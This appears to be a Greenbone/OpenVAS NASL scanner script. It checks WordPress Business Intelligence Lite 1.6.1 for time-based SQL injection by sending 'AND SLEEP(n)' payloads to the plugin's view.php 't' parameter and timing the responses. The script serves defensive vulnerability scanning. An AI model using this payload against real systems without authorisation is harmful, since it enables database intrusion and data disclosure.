CPE = "cpe:/a:wordpress:wordpress";
if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.805366" );
	script_version( "2020-02-26T12:57:19+0000" );
	script_tag( name: "cvss_base", value: "7.5" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:P/I:P/A:P" );
	script_tag( name: "last_modification", value: "2020-02-26 12:57:19 +0000 (Wed, 26 Feb 2020)" );
	script_tag( name: "creation_date", value: "2015-04-10 12:21:47 +0530 (Fri, 10 Apr 2015)" );
	script_tag( name: "qod_type", value: "remote_analysis" );
	script_name( "WordPress Business Intelligence Lite SQL Injection Vulnerability" );
	script_tag( name: "summary", value: "This host is installed with WordPress
  Business Intelligence Lite and is prone to sql injection vulnerability." );
	script_tag( name: "vuldetect", value: "Send a crafted request via HTTP GET and
  check whether it is able to execute sql query or not." );
	script_tag( name: "insight", value: "Flaw is due to the 'view.php' script not
  properly sanitizing user-supplied input to the 't' parameter." );
	script_tag( name: "impact", value: "Successful exploitation will allow remote
  attackers to inject or manipulate SQL queries in the back-end database,
  allowing for the manipulation or disclosure of arbitrary data." );
	script_tag( name: "affected", value: "WordPress Business Intelligence Lite Plugin
  version 1.6.1, Prior versions may also be affected." );
	script_tag( name: "solution", value: "Upgrade to WordPress Business Intelligence
  Lite Plugin 1.6.2 or later." );
	script_tag( name: "solution_type", value: "VendorFix" );
	script_xref( name: "URL", value: "http://www.exploit-db.com/exploits/36600" );
	script_category( ACT_ATTACK );
	script_copyright( "Copyright (C) 2015 Greenbone Networks GmbH" );
	script_family( "Web application abuses" );
	script_dependencies( "secpod_wordpress_detect_900182.sc" );
	script_mandatory_keys( "wordpress/installed" );
	script_require_ports( "Services/www", 80 );
	script_xref( name: "URL", value: "https://wordpress.org/plugins/wp-business-intelligence-lite" );
	exit( 0 );
}
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("host_details.inc.sc");
wait_extra_sec = 5;
if(!http_port = get_app_port( cpe: CPE )){
	exit( 0 );
}
if(!dir = get_app_location( cpe: CPE, port: http_port )){
	exit( 0 );
}
sleep = make_list( 3,
	 5 );
for sec in sleep {
	url = dir + "/wp-content/plugins/wp-business-intelligence-lite/view.php?t=1%20AND%20SLEEP(" + sec + ")";
	sndReq = http_get( item: url, port: http_port );
	start = unixtime();
	rcvRes = http_keepalive_send_recv( port: http_port, data: sndReq );
	stop = unixtime();
	time_taken = stop - start;
	if(time_taken + 1 < sec || time_taken > ( sec + wait_extra_sec )){
		exit( 0 );
	}
}
security_message( http_port );
exit( 0 );

